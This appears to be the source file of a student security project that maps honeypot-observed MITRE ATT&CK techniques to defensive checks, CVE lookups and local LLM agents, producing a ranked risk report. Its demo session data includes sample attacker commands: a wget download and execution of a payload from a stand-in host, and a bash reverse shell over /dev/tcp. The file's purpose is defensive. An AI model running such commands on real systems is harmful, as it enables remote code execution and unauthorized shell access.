"""
CyberSentinel AI — cybersentinel_skeleton.py
SIH26153 · Threat-informed autonomous security testing
Team: Utkarsh Chaubey, Ayush Verma, Umang Srivastava, Mohd Uvais

Phase 1 complete:
  - Cowrie honeypot → TTP extraction → test case fan-out → 3-agent parallel scan → ranked report
  
Week 1 update:
  - All asyncio.sleep() stubs replaced with real Ollama (Mistral 7B) calls
  - Real NVD CVE lookups via public API
  - Deterministic scoring (exploitability × impact) — LLM only writes explanation text
"""

import asyncio
import json
import re
import time
import urllib.request
import urllib.error
from datetime import datetime

# ─────────────────────────────────────────────
# CONFIGURATION
# ─────────────────────────────────────────────

OLLAMA_URL = "http://10.0.2.2:11434/api/generate"
OLLAMA_MODEL = "mistral"
OLLAMA_TIMEOUT = 120          # seconds per agent call — increased for queued requests
NVD_API_URL = "https://services.nvd.nist.gov/rest/json/cves/2.0"
NVD_TIMEOUT = 10

# SIH26153 requires the working demo interface to "run fully offline without
# cloud API dependencies." The NVD lookup below is the one piece of this
# pipeline that needs real internet access. cve_cache.json — pre-populated
# once by running `python3 prefetch_cve_cache.py` while online — removes
# that dependency at demo time: every technique keyword the CVE-match agent
# can ever look up (see TECHNIQUE_NVD_KEYWORDS below) gets fetched and
# cached in advance, so a live demo run never needs a network call to show
# real CVE data, even fully air-gapped.
CVE_CACHE_PATH = "cve_cache.json"

# Semaphore: max 2 concurrent Ollama calls at any time.
# Mistral 7B processes ~1 request at a time — flooding it causes timeouts.
# With semaphore=2: requests queue locally, none time out.
# Increase to 3 if your Windows host has a GPU; keep at 2 for CPU-only.
_ollama_sem: asyncio.Semaphore | None = None

def _get_sem() -> asyncio.Semaphore:
    global _ollama_sem
    if _ollama_sem is None:
        _ollama_sem = asyncio.Semaphore(1)
    return _ollama_sem

# Only ever scan these targets — hard scope enforcement
AUTHORIZED_TARGETS = [
    "127.0.0.1",
    "localhost",
    "10.0.2.2",          # Windows host from Kali VM
    "192.168.56.0/24",   # Host-only network
]

# MITRE ATT&CK technique registry — bounded taxonomy
# Covers all techniques commonly observed in Cowrie SSH honeypot sessions.
# Format: technique_id → {name, check, criticality (0-1)}
# criticality = asset impact if technique succeeds (used in scoring)
TECHNIQUE_REGISTRY = {
    # ── Credential Access ────────────────────────────────────────────
    "T1110": {
        "name": "Brute Force",
        "check": "Is SSH/login rate limiting configured? Are default credentials rejected?",
        "criticality": 0.85,
    },
    "T1110.001": {
        "name": "Brute Force: Password Guessing",
        "check": "Is account lockout after N failures enabled? Are weak passwords blocked?",
        "criticality": 0.85,
    },
    "T1110.003": {
        "name": "Brute Force: Password Spraying",
        "check": "Is cross-account rate limiting active? Are login attempts aggregated?",
        "criticality": 0.80,
    },
    "T1552": {
        "name": "Unsecured Credentials",
        "check": "Are credentials stored in plaintext files? Is /etc/passwd shadowed correctly?",
        "criticality": 0.90,
    },
    "T1078": {
        "name": "Valid Accounts",
        "check": "Are default/guest accounts disabled? Is account enumeration blocked?",
        "criticality": 0.85,
    },
    "T1078.001": {
        "name": "Valid Accounts: Default Accounts",
        "check": "Are default OS/service credentials changed? Are guest accounts disabled?",
        "criticality": 0.90,
    },
    # ── Discovery ────────────────────────────────────────────────────
    "T1082": {
        "name": "System Information Discovery",
        "check": "Is uname/sysinfo output suppressed from unauthenticated callers?",
        "criticality": 0.50,
    },
    "T1083": {
        "name": "File and Directory Discovery",
        "check": "Are sensitive directories (/, /etc, /root) accessible post-login? Is ls restricted?",
        "criticality": 0.55,
    },
    "T1057": {
        "name": "Process Discovery",
        "check": "Is ps/top access restricted for low-privilege users?",
        "criticality": 0.45,
    },
    "T1087": {
        "name": "Account Discovery",
        "check": "Is /etc/passwd readable by all users? Is whoami/id output exposed?",
        "criticality": 0.60,
    },
    "T1087.001": {
        "name": "Account Discovery: Local Account",
        "check": "Is /etc/passwd world-readable? Is getent passwd restricted?",
        "criticality": 0.60,
    },
    "T1016": {
        "name": "System Network Configuration Discovery",
        "check": "Is ifconfig/ip output restricted? Are internal network ranges exposed?",
        "criticality": 0.55,
    },
    "T1049": {
        "name": "System Network Connections Discovery",
        "check": "Is netstat/ss access logged? Are connection listings restricted to root?",
        "criticality": 0.50,
    },
    "T1033": {
        "name": "System Owner/User Discovery",
        "check": "Is who/w output suppressed? Are logged-in users visible to unprivileged sessions?",
        "criticality": 0.45,
    },
    "T1046": {
        "name": "Network Service Scanning",
        "check": "Is port scanning detected and blocked? Are internal services firewalled? Is an IDS monitoring for scan signatures (sequential/randomised port access)?",
        "criticality": 0.65,
    },
    # ── Execution ────────────────────────────────────────────────────
    "T1059": {
        "name": "Command and Scripting Interpreter",
        "check": "Are shell interpreters restricted? Is script execution logged?",
        "criticality": 0.90,
    },
    "T1059.004": {
        "name": "Unix Shell",
        "check": "Is bash/sh access restricted post-login? Are interactive shells logged?",
        "criticality": 0.90,
    },
    "T1059.006": {
        "name": "Python",
        "check": "Is python/python3 accessible to non-root users? Is execution logged?",
        "criticality": 0.85,
    },
    "T1053": {
        "name": "Scheduled Task/Job",
        "check": "Is crontab access restricted? Are new cron jobs audited?",
        "criticality": 0.80,
    },
    # ── Lateral Movement / Remote Services ──────────────────────────
    "T1021": {
        "name": "Remote Services",
        "check": "Are remote service ports exposed? Is MFA enforced on remote access?",
        "criticality": 0.80,
    },
    "T1021.004": {
        "name": "Remote Services: SSH",
        "check": "Is SSH key-only auth enforced? Is root login disabled? Is port 22 firewalled?",
        "criticality": 0.85,
    },
    # ── Command & Control / Exfiltration ────────────────────────────
    "T1105": {
        "name": "Ingress Tool Transfer",
        "check": "Are outbound connections to unknown IPs blocked? Is wget/curl restricted?",
        "criticality": 0.75,
    },
    "T1071": {
        "name": "Application Layer Protocol",
        "check": "Is outbound HTTP/HTTPS to unknown hosts blocked? Is DNS monitored?",
        "criticality": 0.70,
    },
    "T1048": {
        "name": "Exfiltration Over Alternative Protocol",
        "check": "Is outbound SCP/SFTP/FTP to unknown hosts blocked?",
        "criticality": 0.80,
    },
    # ── Collection / Exfiltration (attack1.sh Phase 13) ──────────────
    "T1005": {
        "name": "Data from Local System",
        "check": "Are sensitive files (SSH keys, /etc/passwd, configs) readable and archivable by a compromised low-priv session? Is file-access auditing (e.g. auditd watch rules) in place?",
        "criticality": 0.80,
    },
    "T1041": {
        "name": "Exfiltration Over C2 Channel",
        "check": "Is outbound POST/upload traffic to unrecognized hosts blocked or DLP-inspected? Is egress filtering enforced on the compromised host's network segment?",
        "criticality": 0.85,
    },
    # ── Persistence ──────────────────────────────────────────────────
    "T1136": {
        "name": "Create Account",
        "check": "Is useradd/adduser restricted? Are new accounts audited in real-time?",
        "criticality": 0.90,
    },
    "T1098": {
        "name": "Account Manipulation",
        "check": "Is passwd/chpasswd restricted? Are SSH authorized_keys changes monitored?",
        "criticality": 0.90,
    },
    "T1053.003": {
        "name": "Cron",
        "check": "Is /etc/cron.d write-protected? Are user crontabs audited?",
        "criticality": 0.80,
    },
    # ── Privilege Escalation ─────────────────────────────────────────
    "T1548": {
        "name": "Abuse Elevation Control Mechanism",
        "check": "Is sudo restricted to specific commands? Is SUID binary list audited?",
        "criticality": 0.95,
    },
    "T1068": {
        "name": "Exploitation for Privilege Escalation",
        "check": "Is kernel up to date? Are SUID/SGID binaries minimized?",
        "criticality": 0.95,
    },
    # ── Defense Evasion ──────────────────────────────────────────────
    "T1070": {
        "name": "Indicator Removal",
        "check": "Are log files write-protected? Is log tampering (rm /var/log/*) detected?",
        "criticality": 0.75,
    },
    "T1027": {
        "name": "Obfuscated Files or Information",
        "check": "Is base64-encoded command execution logged and alerted?",
        "criticality": 0.70,
    },
    # ── Initial Access ───────────────────────────────────────────────
    "T1190": {
        "name": "Exploit Public-Facing Application",
        "check": "Are public endpoints patched? Is WAF/IDS active?",
        "criticality": 0.95,
    },
    "T1133": {
        "name": "External Remote Services",
        "check": "Is SSH/VPN access restricted by IP allowlist? Is MFA enforced?",
        "criticality": 0.85,
    },
    # ── Execution (user-triggered) ────────────────────────────────────
    "T1204": {
        "name": "User Execution",
        "check": "Are downloaded executables blocked from running? Is noexec set on /tmp? Is AppArmor/SELinux enforcing?",
        "criticality": 0.85,
    },
    "T1204.002": {
        "name": "User Execution: Malicious File",
        "check": "Are executable files downloaded via wget/curl blocked from running? Is /tmp noexec mounted?",
        "criticality": 0.85,
    },
    # ── Impact ───────────────────────────────────────────────────────
    "T1489": {
        "name": "Service Stop",
        "check": "Are systemctl/service commands restricted to root? Is service manipulation audited?",
        "criticality": 0.90,
    },
    "T1499": {
        "name": "Endpoint Denial of Service",
        "check": "Is connection rate limiting enabled? Are SYN flood protections (SYN cookies) active? Is per-IP connection capping configured?",
        "criticality": 0.75,
    },
    "T1485": {
        "name": "Data Destruction",
        "check": "Are rm -rf patterns on critical paths blocked? Is filesystem integrity monitored?",
        "criticality": 0.95,
    },
    "T1496": {
        "name": "Resource Hijacking",
        "check": "Is CPU/network usage monitored for anomalies? Are cryptomining processes detected?",
        "criticality": 0.70,
    },
}

# ─────────────────────────────────────────────
# OLLAMA HELPER
# ─────────────────────────────────────────────

def ollama_call(prompt: str, system: str = "", max_tokens: int = 512) -> str:
    """
    Synchronous HTTP call to local Ollama Mistral.
    Returns the model's response text, or an error string.
    Agent reasoning is always local — no cloud dependency.
    """
    full_prompt = f"{system}\n\n{prompt}" if system else prompt

    payload = json.dumps({
        "model": OLLAMA_MODEL,
        "prompt": full_prompt,
        "stream": False,
        "options": {
            "num_predict": max_tokens,
            "temperature": 0.2,    # low temperature → more deterministic security analysis
            "top_p": 0.9,
        }
    }).encode("utf-8")

    req = urllib.request.Request(
        OLLAMA_URL,
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )

    try:
        with urllib.request.urlopen(req, timeout=OLLAMA_TIMEOUT) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            return data.get("response", "").strip()
    except urllib.error.URLError as e:
        return f"[Ollama unreachable: {e.reason}]"
    except Exception as e:
        return f"[Ollama error: {e}]"


# ─────────────────────────────────────────────
# NVD CVE LOOKUP HELPER
# ─────────────────────────────────────────────

_cve_cache = None   # lazy-loaded module-level dict: {keyword: [cve_dict, ...]}


def _load_cve_cache() -> dict:
    global _cve_cache
    if _cve_cache is None:
        try:
            with open(CVE_CACHE_PATH) as f:
                _cve_cache = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            _cve_cache = {}
    return _cve_cache


def _save_cve_cache() -> None:
    if _cve_cache is not None:
        try:
            with open(CVE_CACHE_PATH, "w") as f:
                json.dump(_cve_cache, f, indent=2)
        except Exception:
            pass   # cache is a convenience, never let a write failure break a lookup


def nvd_cve_lookup(keyword: str, max_results: int = 3, use_cache: bool = True) -> list[dict]:
    """
    Query NVD public API for CVEs matching a keyword (e.g. 'OpenSSH 7.4').
    Returns list of {id, description, cvss_score, published}.

    Checks cve_cache.json first (see CVE_CACHE_PATH above) — a cache hit,
    including a legitimately empty result ("NVD has no CVEs for this
    keyword"), returns immediately with no network call. A cache miss falls
    through to the live NVD call and, on success, is written back to the
    cache. A network failure still returns [] (offline-safe) but is NOT
    cached, so a later run with internet access can fill it in.

    Run `prefetch_cve_cache.py` once while online to pre-populate every
    keyword the CVE-match agent can look up, so the demo interface never
    needs live internet at presentation time.
    """
    cache = _load_cve_cache() if use_cache else {}
    if use_cache and keyword in cache:
        return cache[keyword]

    try:
        url = f"{NVD_API_URL}?keywordSearch={urllib.parse.quote(keyword)}&resultsPerPage={max_results}"
        req = urllib.request.Request(url, headers={"User-Agent": "CyberSentinel-AI/1.0"})
        with urllib.request.urlopen(req, timeout=NVD_TIMEOUT) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            results = []
            for vuln in data.get("vulnerabilities", []):
                cve = vuln.get("cve", {})
                cve_id = cve.get("id", "UNKNOWN")
                desc = ""
                for d in cve.get("descriptions", []):
                    if d.get("lang") == "en":
                        desc = d.get("value", "")[:200]
                        break
                # Extract CVSS score: prefer v3.1 → v3.0 → v2 fallback
                cvss_score = 0.0
                metrics = cve.get("metrics", {})
                for key in ("cvssMetricV31", "cvssMetricV30"):
                    if key in metrics:
                        try:
                            cvss_score = metrics[key][0]["cvssData"]["baseScore"]
                        except (KeyError, IndexError):
                            pass
                        break
                if cvss_score == 0.0 and "cvssMetricV2" in metrics:
                    try:
                        cvss_score = metrics["cvssMetricV2"][0]["cvssData"]["baseScore"]
                    except (KeyError, IndexError):
                        pass
                published = cve.get("published", "")[:10]
                results.append({
                    "id": cve_id,
                    "description": desc,
                    "cvss_score": cvss_score,
                    "published": published,
                })
            if use_cache:
                cache[keyword] = results
                _save_cve_cache()
            return results
    except Exception:
        return []   # graceful offline fallback — not cached, retry-able later


# urllib.parse needed for nvd_cve_lookup
import urllib.parse


# ─────────────────────────────────────────────
# STAGE 1: TTP LOADER
# ─────────────────────────────────────────────

def load_ttp_records(path: str = "ttp_records.json") -> list[dict]:
    """Load TTP extraction output from ttp_extract.py."""
    try:
        with open(path, "r") as f:
            records = json.load(f)
        print(f"[TTP] Loaded {len(records)} session records from {path}")
        return records
    except FileNotFoundError:
        print(f"[TTP] {path} not found — using demo records")
        return _demo_ttp_records()


def _demo_ttp_records() -> list[dict]:
    """Fallback demo records if ttp_records.json is not present."""
    return [
        {
            "session_id": "demo_session_001",
            "src_ip": "172.18.0.1",
            "techniques": ["T1110", "T1105"],
            "commands": ["wget http://malicious.example/payload", "chmod +x payload", "./payload"],
            "event_count": 47,
            "duration_s": 12.4,
        },
        {
            "session_id": "demo_session_002",
            "src_ip": "10.0.0.99",
            "techniques": ["T1082", "T1059"],
            "commands": ["uname -a", "cat /etc/passwd", "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1"],
            "event_count": 23,
            "duration_s": 7.1,
        },
    ]


# ─────────────────────────────────────────────
# STAGE 2: TEST CASE TRANSLATOR
# Fan-out: every technique → test case → all 3 agent queues
# ─────────────────────────────────────────────

def translate_ttps_to_test_cases(records: list[dict]) -> list[dict]:
    """
    Convert observed MITRE ATT&CK technique IDs into bounded, defensive test cases.
    Bounded = only generates checks from TECHNIQUE_REGISTRY — never invents new attack types.
    These are checks, not attacks. T1110 → 'is rate limiting on?', not 'run a brute force'.
    """
    seen = set()
    test_cases = []

    for record in records:
        target = record.get("src_ip", "127.0.0.1")
        if not _is_authorized(target):
            print(f"[Translator] Skipping unauthorized target {target}")
            continue

        for technique_entry in record.get("techniques", []):
            # Support both plain strings ("T1110") and dicts ({"id": "T1110", "name": ...})
            if isinstance(technique_entry, dict):
                tid = technique_entry.get("id") or technique_entry.get("technique_id", "")
            else:
                tid = str(technique_entry)

            if not tid:
                continue
            if tid in seen:
                continue
            seen.add(tid)

            if tid not in TECHNIQUE_REGISTRY:
                # Unknown technique — add with generic check rather than silently drop
                print(f"  [Translator] Unknown technique {tid} — adding with generic check")
                technique = {
                    "name": technique_entry.get("name", tid) if isinstance(technique_entry, dict) else tid,
                    "check": f"Is the system protected against {tid}? Review MITRE ATT&CK page for this technique.",
                    "criticality": 0.60,   # default moderate criticality
                }
            else:
                technique = TECHNIQUE_REGISTRY[tid]

            test_cases.append({
                "technique_id": tid,
                "technique_name": technique["name"],
                "check_question": technique["check"],
                "asset_criticality": technique["criticality"],
                "target": target,
                "source_sessions": [
                    r["session_id"] for r in records
                    if tid in [
                        (t.get("id") or t.get("technique_id", "")) if isinstance(t, dict) else str(t)
                        for t in r.get("techniques", [])
                    ]
                ],
            })

    print(f"[Translator] Generated {len(test_cases)} test cases from {len(seen)} unique techniques")
    return test_cases


def _is_authorized(target: str) -> bool:
    """Hard scope check — never scan anything not in AUTHORIZED_TARGETS."""
    for auth in AUTHORIZED_TARGETS:
        if target == auth or target.startswith(auth.split("/")[0][:8]):
            return True
    return False


# ─────────────────────────────────────────────
# STAGE 3: AGENT QUEUES (fan-out pattern)
# ─────────────────────────────────────────────

async def fan_out(test_cases: list[dict],
                  recon_q: asyncio.Queue,
                  cve_q: asyncio.Queue,
                  logic_q: asyncio.Queue):
    """Broadcast every test case to all three agent queues."""
    for tc in test_cases:
        await recon_q.put(tc)
        await cve_q.put(tc)
        await logic_q.put(tc)
    # Sentinel to signal end
    for q in (recon_q, cve_q, logic_q):
        await q.put(None)
    print(f"[Fan-out] Distributed {len(test_cases)} test cases to 3 agent queues")


# ─────────────────────────────────────────────
# AGENT 1: RECON AGENT
# Maps what endpoints/services exist on the authorized target
# ─────────────────────────────────────────────

RECON_SYSTEM = """You are a security recon agent. Given an observed MITRE ATT&CK technique and a target IP, 
your job is to identify what services or endpoints would need to exist on that target for this technique to apply.
Be specific and concise. Output 2-4 bullet points. Focus on: ports, services, protocols, and service versions.
Do not invent CVEs. Do not suggest offensive actions. Only describe what to look for."""

async def _recon_one(tc: dict, results: list, loop: asyncio.AbstractEventLoop):
    """Process one test case in the recon agent."""
    tid = tc["technique_id"]
    target = tc["target"]
    print(f"  [Recon] Analyzing {tid} ({tc['technique_name']}) on {target}")
    prompt = f"""Target: {target}
Observed technique: {tid} — {tc['technique_name']}
Check question: {tc['check_question']}

What services and endpoints on this target would be involved in or vulnerable to this technique?
List specific ports, protocols, and service names to investigate."""
    async with _get_sem():
        response = await loop.run_in_executor(
            None, lambda p=prompt: ollama_call(p, system=RECON_SYSTEM, max_tokens=180)
        )
    results.append({
        "agent": "recon",
        "technique_id": tid,
        "technique_name": tc["technique_name"],
        "target": target,
        "asset_criticality": tc["asset_criticality"],
        "source_sessions": tc["source_sessions"],
        "finding": response,
        "raw_check": tc["check_question"],
    })
    print(f"  [Recon] Done {tid}")


async def recon_agent(queue: asyncio.Queue, results: list, loop: asyncio.AbstractEventLoop):
    """
    Agent 1: Maps endpoints and services relevant to each observed technique.
    Drains the queue, then fires all technique analyses concurrently.
    """
    tasks = []
    while True:
        tc = await queue.get()
        if tc is None:
            break
        tasks.append(_recon_one(tc, results, loop))
    if tasks:
        await asyncio.gather(*tasks)


# ─────────────────────────────────────────────
# AGENT 2: CVE-MATCH AGENT
# Looks up known CVEs for the tech stack the recon agent identified
# ─────────────────────────────────────────────

CVE_SYSTEM = """You are a CVE analysis agent. Given an observed attack technique and CVE data, 
explain concisely: (1) which CVEs are most relevant to this technique, (2) their exploitability risk, 
and (3) the recommended remediation priority.
Be specific. Use the CVE IDs provided. Do not invent new CVE IDs."""

# Keyword map: technique → NVD search term
# Tuned for honeypot-observed techniques — more specific = better CVE matches
TECHNIQUE_NVD_KEYWORDS = {
    "T1110":     "SSH brute force authentication bypass",
    "T1110.001": "SSH password guessing authentication",
    "T1110.003": "password spraying account lockout",
    "T1552":     "plaintext credentials configuration file",
    "T1078":     "default credentials authentication bypass",
    "T1078.001": "default account password Linux",
    "T1082":     "information disclosure system uname Linux",
    "T1083":     "directory traversal file disclosure",
    "T1057":     "process listing privilege escalation Linux",
    "T1087":     "account enumeration /etc/passwd disclosure",
    "T1087.001": "local account enumeration Linux passwd",
    "T1016":     "network configuration disclosure ifconfig",
    "T1049":     "network connection listing netstat",
    "T1033":     "user discovery Linux who",
    "T1046":     "network service scanning nmap port scan detection",
    "T1552":     "unsecured credentials private key exposure Linux",
    "T1059":     "bash shell command injection",
    "T1059.004": "unix shell injection bash",
    "T1059.006": "python code execution exploit",
    "T1053":     "cron job privilege escalation",
    "T1021":     "SSH remote service exploit",
    "T1021.004": "OpenSSH remote code execution",
    "T1105":     "wget curl remote file download malware",
    "T1071":     "HTTP covert channel command control",
    "T1048":     "data exfiltration SSH SCP FTP",
    "T1005":     "local file collection sensitive data disclosure Linux",
    "T1041":     "data exfiltration HTTP POST C2 channel",
    "T1136":     "Linux user account creation exploit",
    "T1098":     "SSH authorized_keys manipulation",
    "T1053.003": "cron privilege escalation Linux",
    "T1548":     "sudo SUID privilege escalation Linux",
    "T1068":     "Linux kernel privilege escalation exploit",
    "T1070":     "log file deletion Linux audit",
    "T1027":     "base64 obfuscation malware Linux",
    "T1190":     "public application RCE exploit CVE",
    "T1133":     "SSH VPN external remote access exploit",
    "T1204":     "arbitrary code execution user privilege Linux",
    "T1204.002": "malicious executable download Linux noexec",
    "T1489":     "service stop Linux systemctl exploit",
    "T1499":     "denial of service SYN flood connection exhaustion Linux",
    "T1485":     "data destruction Linux filesystem wipe",
    "T1496":     "cryptomining malware Linux CPU hijack",
}

async def _cve_one(tc: dict, results: list, loop: asyncio.AbstractEventLoop):
    """Process one test case in the CVE-match agent."""
    tid = tc["technique_id"]
    print(f"  [CVE] Looking up CVEs for {tid} ({tc['technique_name']})")
    keyword = TECHNIQUE_NVD_KEYWORDS.get(tid, tc["technique_name"])
    cves = await loop.run_in_executor(
        None, lambda k=keyword: nvd_cve_lookup(k, max_results=3)
    )
    max_cvss = 0.0
    if cves:
        lines = []
        for c in cves:
            lines.append(f"- {c['id']} (CVSS {c['cvss_score']}, {c['published']}): {c['description']}")
            if c["cvss_score"] > max_cvss:
                max_cvss = c["cvss_score"]
        cve_summary = "\n".join(lines)
    else:
        cve_summary = "No CVEs returned from NVD (may be offline or no matches)."
    prompt = f"""Observed technique: {tid} — {tc['technique_name']}
Check question: {tc['check_question']}

CVEs found:
{cve_summary}

Analyze: which CVEs are most exploitable for this technique? What is the remediation priority?"""
    async with _get_sem():
        response = await loop.run_in_executor(
            None, lambda p=prompt: ollama_call(p, system=CVE_SYSTEM, max_tokens=180)
        )
    exploitability = min(1.0, max_cvss / 10.0) if max_cvss > 0 else 0.3
    results.append({
        "agent": "cve_match",
        "technique_id": tid,
        "technique_name": tc["technique_name"],
        "target": tc["target"],
        "asset_criticality": tc["asset_criticality"],
        "source_sessions": tc["source_sessions"],
        "cves_found": cves,
        "max_cvss": max_cvss,
        "exploitability": exploitability,
        "finding": response,
        "raw_check": tc["check_question"],
    })
    print(f"  [CVE] Done {tid} — {len(cves)} CVEs found, max CVSS {max_cvss}")


async def cve_match_agent(queue: asyncio.Queue, results: list, loop: asyncio.AbstractEventLoop):
    """
    Agent 2: Fetches real CVEs from NVD for each technique, then uses Ollama
    to reason about which are most relevant and how to prioritize remediation.
    Drains the queue, then fires all lookups concurrently.
    """
    tasks = []
    while True:
        tc = await queue.get()
        if tc is None:
            break
        tasks.append(_cve_one(tc, results, loop))
    if tasks:
        await asyncio.gather(*tasks)


# ─────────────────────────────────────────────
# AGENT 3: LOGIC / CONFIG AGENT
# Checks for misconfigurations and weak authentication
# ─────────────────────────────────────────────

LOGIC_SYSTEM = """You are a security configuration audit agent. Given an observed attack technique,
reason about what misconfigurations or weak settings would allow this technique to succeed.
Output: (1) the most likely misconfiguration, (2) how to verify it is present, (3) how to fix it.
Be specific and actionable. Keep each point to 1-2 sentences."""

async def _logic_one(tc: dict, results: list, loop: asyncio.AbstractEventLoop):
    """Process one test case in the logic/config agent."""
    tid = tc["technique_id"]
    print(f"  [Logic] Config-checking {tid} ({tc['technique_name']})")
    prompt = f"""Observed attack technique: {tid} — {tc['technique_name']}
Audit question: {tc['check_question']}
Target: {tc['target']}

What specific misconfigurations or weak security settings would enable this technique?
How do you verify they exist? How do you fix them?"""
    async with _get_sem():
        response = await loop.run_in_executor(
            None, lambda p=prompt: ollama_call(p, system=LOGIC_SYSTEM, max_tokens=180)
        )
    results.append({
        "agent": "logic_config",
        "technique_id": tid,
        "technique_name": tc["technique_name"],
        "target": tc["target"],
        "asset_criticality": tc["asset_criticality"],
        "source_sessions": tc["source_sessions"],
        "finding": response,
        "raw_check": tc["check_question"],
    })
    print(f"  [Logic] Done {tid}")


async def logic_config_agent(queue: asyncio.Queue, results: list, loop: asyncio.AbstractEventLoop):
    """
    Agent 3: Uses Ollama to identify misconfigurations and weak settings.
    Drains the queue, then fires all checks concurrently.
    """
    tasks = []
    while True:
        tc = await queue.get()
        if tc is None:
            break
        tasks.append(_logic_one(tc, results, loop))
    if tasks:
        await asyncio.gather(*tasks)


# ─────────────────────────────────────────────
# STAGE 4: ORCHESTRATOR
# Deduplicates, scores, and ranks all agent findings
# ─────────────────────────────────────────────

def score_finding(technique_id: str,
                  asset_criticality: float,
                  exploitability: float = 0.5,
                  agent: str = "") -> float:
    """
    Deterministic risk score: exploitability × asset_criticality.
    Exploitability comes from CVSS (CVE agent) or defaults to 0.5.
    Impact comes from asset_criticality tags in TECHNIQUE_REGISTRY.
    LLM never touches this number — only the explanation text.

    Judge defensibility: 'How did you get 0.72?'
    Answer: 'CVSS 8.8 / 10 × criticality 0.82 = 0.72.'
    """
    return round(exploitability * asset_criticality, 3)


def orchestrate(recon_results: list,
                cve_results: list,
                logic_results: list) -> list[dict]:
    """
    Merge findings from all 3 agents.
    Dedup key: (target, technique_id) — same issue found by multiple agents = one finding.
    Score = exploitability × asset_criticality (deterministic math).
    """
    # Index CVE exploitability scores by technique
    cve_by_tid = {r["technique_id"]: r for r in cve_results}
    recon_by_tid = {r["technique_id"]: r for r in recon_results}
    logic_by_tid = {r["technique_id"]: r for r in logic_results}

    all_tids = set(
        list(cve_by_tid.keys()) +
        list(recon_by_tid.keys()) +
        list(logic_by_tid.keys())
    )

    findings = []
    for tid in all_tids:
        cve_r = cve_by_tid.get(tid, {})
        recon_r = recon_by_tid.get(tid, {})
        logic_r = logic_by_tid.get(tid, {})

        # Use first available record for metadata
        meta = cve_r or recon_r or logic_r
        exploitability = cve_r.get("exploitability", 0.4)
        asset_criticality = meta.get("asset_criticality", 0.5)
        score = score_finding(tid, asset_criticality, exploitability)

        finding = {
            "technique_id": tid,
            "technique_name": meta.get("technique_name", tid),
            "target": meta.get("target", "unknown"),
            "risk_score": score,
            "exploitability": exploitability,
            "asset_criticality": asset_criticality,
            "cves": cve_r.get("cves_found", []),
            "max_cvss": cve_r.get("max_cvss", 0.0),
            "source_sessions": meta.get("source_sessions", []),
            "check_question": meta.get("raw_check", ""),
            "recon_analysis": recon_r.get("finding", ""),
            "cve_analysis": cve_r.get("finding", ""),
            "config_analysis": logic_r.get("finding", ""),
        }
        findings.append(finding)

    # Rank by risk score descending
    findings.sort(key=lambda x: x["risk_score"], reverse=True)
    return findings


# ─────────────────────────────────────────────
# STAGE 5: REPORT GENERATOR
# ─────────────────────────────────────────────

def generate_report(findings: list[dict], output_path: str = "cybersentinel_report.json"):
    """
    Write ranked findings to JSON and print human-readable summary.
    Score = deterministic math. Remediation text = Mistral-generated.
    """
    timestamp = datetime.now().isoformat()

    report = {
        "report_id": f"CSR-{int(time.time())}",
        "generated_at": timestamp,
        "tool": "CyberSentinel AI",
        "version": "1.1.0-ollama",
        "model": OLLAMA_MODEL,
        "total_findings": len(findings),
        "findings": findings,
    }

    with open(output_path, "w") as f:
        json.dump(report, f, indent=2)

    print("\n" + "═" * 60)
    print(f"  CYBERSENTINEL AI — PRIORITIZED FINDINGS REPORT")
    print(f"  Generated: {timestamp}")
    print(f"  Model: Ollama {OLLAMA_MODEL} (fully offline)")
    print("═" * 60)
    print(f"  Total findings: {len(findings)}")
    print()

    for i, f in enumerate(findings, 1):
        severity = "HIGH" if f["risk_score"] >= 0.70 else "MEDIUM" if f["risk_score"] >= 0.40 else "LOW"
        print(f"  #{i}  [{severity}]  {f['technique_id']} — {f['technique_name']}")
        print(f"       Target:       {f['target']}")
        print(f"       Risk score:   {f['risk_score']}  (exploitability {f['exploitability']} × criticality {f['asset_criticality']})")
        if f["cves"]:
            print(f"       Top CVE:      {f['cves'][0]['id']} (CVSS {f['cves'][0]['cvss_score']})")
        print(f"       Sessions:     {f['source_sessions']}")
        print(f"       Check:        {f['check_question']}")
        if f["config_analysis"]:
            # Print first 2 lines of config analysis. This is raw LLM
            # output, so every line used to get printed under a hardcoded
            # "Fix:" label even when it was actually stating the
            # misconfiguration or a verification step, not a fix. Label
            # each line by what it actually says instead.
            lines = [l.strip() for l in f["config_analysis"].splitlines() if l.strip()][:2]
            for line in lines:
                lower = line.lower()
                if "verif" in lower[:24]:
                    label = "Verify:"
                elif "misconfig" in lower[:24] or lower.startswith("1."):
                    label = "Finding:"
                else:
                    label = "Fix:"
                print(f"       {label:<14}{line}")
        print()

    print(f"  Full report saved to: {output_path}")
    print("═" * 60 + "\n")
    return report


# ─────────────────────────────────────────────
# MAIN PIPELINE
# ─────────────────────────────────────────────

async def run_pipeline(ttp_path: str = "ttp_records.json",
                       report_path: str = "cybersentinel_report.json"):
    """
    Full pipeline: TTP records → test cases → 3 parallel agents → ranked report.

    Architecture:
      [ttp_records.json]
           ↓
      [Test case translator]  (bounded taxonomy — only TECHNIQUE_REGISTRY entries)
           ↓  fan-out
      ┌────────────┬────────────┬──────────────┐
      │ Recon      │ CVE-match  │ Logic/config │  ← all 3 run in parallel
      │ (Ollama)   │ (NVD+Ollama│ (Ollama)     │
      └────────────┴────────────┴──────────────┘
           ↓  merge + dedup
      [Orchestrator]  (deterministic scoring)
           ↓
      [Ranked report JSON]
    """
    print("\n[CyberSentinel] Starting pipeline...")
    print(f"[CyberSentinel] Ollama endpoint: {OLLAMA_URL}")
    print(f"[CyberSentinel] Model: {OLLAMA_MODEL}")
    print(f"[CyberSentinel] Authorized targets: {AUTHORIZED_TARGETS}\n")

    # Verify Ollama is reachable before running
    print("[CyberSentinel] Verifying Ollama connectivity...")
    test_resp = ollama_call("Reply with only the word: READY", max_tokens=10)
    if "unreachable" in test_resp.lower() or "error" in test_resp.lower():
        print(f"[CyberSentinel] WARNING — Ollama not reachable: {test_resp}")
        print("[CyberSentinel] Check: curl http://10.0.2.2:11434/api/tags")
        print("[CyberSentinel] Continuing with degraded mode (findings will note connection issue)\n")
    else:
        print(f"[CyberSentinel] Ollama online. Response: '{test_resp}'\n")

    # Stage 1 — Load TTP records
    records = load_ttp_records(ttp_path)

    # Diagnostic: show all unique techniques found in ttp_records.json
    print("[Diagnostic] Techniques found across all sessions:")
    all_techs = {}
    for r in records:
        for t in r.get("techniques", []):
